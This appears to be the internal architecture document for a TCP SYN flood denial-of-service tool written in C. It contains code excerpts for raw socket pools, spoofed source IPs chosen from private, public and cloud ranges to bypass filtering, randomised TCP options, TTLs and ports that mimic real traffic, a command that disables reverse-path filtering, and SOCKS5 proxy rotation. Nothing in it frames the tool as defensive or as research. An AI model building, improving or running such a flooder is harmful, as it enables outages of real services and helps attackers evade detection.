# Architecture and Working Logic

## Overview

This document provides a detailed explanation of how the TCP SYN flood tool works internally, including algorithms, data structures, and execution flow.

## System Architecture

### High-Level Design

```
┌─────────────────────────────────────────────────────────────┐
│                        Main Process                         │
│                                                             │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │  Argument    │    │  Rate        │    │  Statistics  │   │
│  │  Parser      │    │  Limiter     │    │  Thread      │   │
│  │              │    │              │    │  (Monitoring)│   │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘   │
│         │                    │                    │         │
│         ▼                    ▼                    ▼         │
│  ┌──────────────────────────────────────────────────────┐   │
│  │              Thread Pool Manager                     │   │
│  │  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐      │   │
│  │  │Thread1 │  │Thread2 │  │Thread3 │  │ThreadN │      │   │
│  │  └───┬────┘  └───┬────┘  └───┬────┘  └───┬────┘      │   │
│  └──────┼───────────┼───────────┼───────────┼───────────┘   │
│         │           │           │           │               │
└─────────┼───────────┼───────────┼───────────┼───────────────┘
          │           │           │           │
          ▼           ▼           ▼           ▼
    ┌─────────────────────────────────────────────┐
    │         Raw Socket Layer                    │
    │  (PF_INET, SOCK_RAW, IPPROTO_TCP)           │
    └──────────────────┬──────────────────────────┘
                       │
                       ▼
              ┌─────────────────┐
              │  Network Stack  │
              │  (Kernel)       │
              └─────────────────┘
```

## Core Components

### 1. Main Process (`main()`)

**Responsibilities:**
- Parse command-line arguments
- Validate input parameters
- Disable reverse path filtering (`rp_filter`)
- Increase file descriptor limits
- Load SOCKS5 proxies (if enabled)
- Create and manage worker threads
- Handle signals (SIGINT, SIGTERM)
- Display statistics

**Key Operations:**
```c
// Disable rp_filter
system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter");

// Increase file descriptors
getrlimit(RLIMIT_NOFILE, &rl);
rl.rlim_cur = rl.rlim_max;
setrlimit(RLIMIT_NOFILE, &rl);
```

### 2. Flooding Thread (`flooding_thread()`)

**Responsibilities:**
- Create raw sockets (up to 5,000 per thread)
- Generate spoofed source IPs
- Craft TCP SYN packets with random options
- Maintain connection state tracking
- Send packets via `sendto()`

**Socket Creation:**
```c
for (int i = 0; i < num_sockets; i++) {
    sockets[i] = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt(sockets[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    // Set large buffers
    setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    fcntl(sockets[i], F_SETFL, flags | O_NONBLOCK);
}
```

### 3. Connection State Tracking

**Data Structure:**
```c
typedef struct {
    uint32_t source_ip;
    uint16_t source_port;
    uint32_t seq_base;
    uint32_t seq_current;
    uint64_t packet_count;
} conn_state_t;
```

**Hash Table Lookup:**
- Hash function: `(source_ip ^ source_port) & (CONN_HASH_TABLE_SIZE - 1)`
- O(1) average lookup time
- Handles collisions with linear search fallback

### 4. IP Spoofing Algorithm

**Generation Logic:**
```c
uint32_t generate_spoofed_ip(int thread_id, int iteration) {
    uint32_t time_seed = (uint32_t)time(NULL);
    uint32_t rotation_key = (thread_id * 7919) + (iteration * 997) + 
                           (time_seed * 8191) + ...;
    int ip_class = rotation_key % 100;
    // Distribute across 100 IP ranges
    // Returns spoofed IP address
}
```

**IP Range Distribution:**
- Private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
- Public ranges: Various RIR allocations
- Cloud providers: AWS, CloudFlare ranges
- Realistic distribution for bypass

### 5. TCP Packet Construction

**SYN Packet Structure:**
```
IP Header (20 bytes):
- Version: 4
- IHL: 5
- TTL: 64/128/255 (realistic)
- Protocol: TCP (6)
- Source: Spoofed IP
- Destination: Target IP

TCP Header (20-60 bytes):
- Source Port: Random (1024-65535)
- Destination Port: Target Port
- Flags: SYN=1, ACK=0
- Sequence: Random/Calculated
- Window: 8192-65535
- Data Offset: 5-15 (variable)

TCP Options (0-40 bytes):
- MSS (4 bytes): 90% probability
- Window Scale (3 bytes): 70% probability
- Timestamp (10 bytes): 80% probability
- SACK_PERM (2 bytes): 60% probability
- NOP padding (to 4-byte boundary)
```

**Option Generation:**
```c
int opt_choice = random_number_beetwhen(0, 100);

if (opt_choice < 90) {
    // Include MSS
    tcp_options[offset++] = TCP_OPT_MSS;
    tcp_options[offset++] = 4;
    uint16_t mss = htons(mss_values[random(0, 4)]);
    memcpy(&tcp_options[offset], &mss, 2);
    offset += 2;
}
// Similar for other options...
```

### 6. Checksum Calculation

**IP Checksum:**
```c
iph->check = 0;
iph->check = checksum_tcp_packet((unsigned short *) datagram, sizeof(struct iphdr));
```

**TCP Checksum (with pseudo-header):**
```c
struct pseudo_header psh;
psh.source_address = spoofed_ip;
psh.dest_address = target_ip;
psh.placeholder = 0;
psh.protocol = IPPROTO_TCP;
psh.tcp_length = htons(tcp_len);

// Build pseudogram
memcpy(pseudogram + 12, datagram + sizeof(struct iphdr), tcp_len);
tcph->check = checksum_tcp_packet((unsigned short*) pseudogram, psize);
```

### 7. SOCKS5 Proxy Support

**Proxy Structure:**
```c
typedef struct {
    char ip[64];
    int port;
    char username[256];
    char password[256];
    int has_auth;
    int is_valid;
    uint64_t last_used;
    uint64_t failures;
} socks5_proxy_t;
```

**Proxy Selection:**
- Round-robin with atomic operations
- Failure tracking (skip proxies with >30 failures)
- Auto-rotation on failure

## Algorithms

### Sequence Number Generation

```c
// Base sequence
uint32_t base_seq = (time_base * 2500000) + 
                    (thread_id * 100000000) + 
                    random(10000000, 500000000);

// Per connection
if (conn) {
    conn->seq_current += random(1000000, 5000000);
    seq_val = conn->seq_current;
} else {
    seq_val = base_seq + random_offset;
}
```

### Source Port Selection

```c
uint32_t port_hash = (spoofed_ip ^ (uint32_t)floodport) % 50000;
int port_range_selector = (port_hash % 100);

if (port_range_selector < 40) {
    randSP = 32768 + (port_hash % 32767);  // Linux ephemeral
} else if (port_range_selector < 70) {
    randSP = 49152 + (port_hash % 16383);  // Windows ephemeral
} else {
    randSP = 1024 + (port_hash % 64511);   // Mixed
}
```

### TTL Distribution

```c
if (is_private_ip) {
    if (ttl_choice < 70) {
        iph->ttl = 64;  // 70% Linux
    } else if (ttl_choice < 90) {
        iph->ttl = 128; // 20% Windows
    } else {
        iph->ttl = random(64, 128); // 10% variation
    }
} else {
    // Public IPs - realistic TTL based on distance
    if (ttl_choice < 50) {
        iph->ttl = 64;  // 50% Linux
    } else if (ttl_choice < 75) {
        iph->ttl = 128; // 25% Windows
    } else if (ttl_choice < 90) {
        iph->ttl = 255; // 15% Maximum
    } else {
        iph->ttl = random(32, 64); // 10% Lower
    }
}
```

## Performance Optimizations

### Socket Pooling
- Pre-allocate up to 5,000 sockets per thread
- Reuse sockets across packets
- Non-blocking I/O for maximum throughput

### Memory Management
- Thread-local static buffers for pseudogram
- Avoid malloc/free per packet
- Hash table for O(1) connection lookup

### Batch Updates
- Atomic counter updates every 100 packets
- Reduces synchronization overhead
- Thread-local accumulators

### Connection State
- Hash table with 16,384 entries
- O(1) average lookup
- Linear search fallback for collisions

## Thread Safety

### Atomic Operations
```c
__sync_add_and_fetch(&g_total_packets_sent, local_sent);
__sync_add_and_fetch(&pps, local_pps);
```

### Thread-Local Storage
```c
static __thread uint64_t local_sent = 0;
static __thread uint64_t local_pps = 0;
```

### Cleanup Handlers
```c
pthread_cleanup_push(cleanup_handler, &cleanup_data);
// ... thread code ...
pthread_cleanup_pop(1);
```

## Statistics Collection

### Real-Time Metrics
- Packets per second (PPS)
- Total packets sent
- Failed packets
- Proxy connections (if enabled)
- Estimated bandwidth (Mbps)

### Update Frequency
- Statistics thread updates every second
- Uses atomic operations for thread-safe access
- Calculates PPS from difference in counters

## Error Handling

### Socket Errors
- EAGAIN/EWOULDBLOCK: Normal (buffer full)
- EBADF: Socket closed, skip
- EINVAL: Invalid socket, skip
- Other errors: Track and report

### Proxy Failures
- Track failures per proxy
- Skip proxies with >30 failures
- Auto-rotate to next proxy
- Reset failures after threshold

## Signal Handling

### Graceful Shutdown
```c
void signal_handler(int sig) {
    g_running = 0;
    // Cancel all threads
    for (int i = 0; i < g_threads_created; i++) {
        pthread_cancel(thread[i]);
    }
}
```

### Thread Cancellation
- Async cancellation enabled
- Cleanup handlers ensure resource freeing
- Immediate exit on CTRL+C

## Resource Limits

### File Descriptors
- Increased to system maximum
- Required for large socket pools
- Check with `ulimit -n`

### Memory
- ~50MB per 1000 threads
- Connection state: ~160KB per thread
- Hash table: ~64KB per thread

### CPU
- Multi-core utilization
- Thread affinity (if configured)
- CPU-bound operation

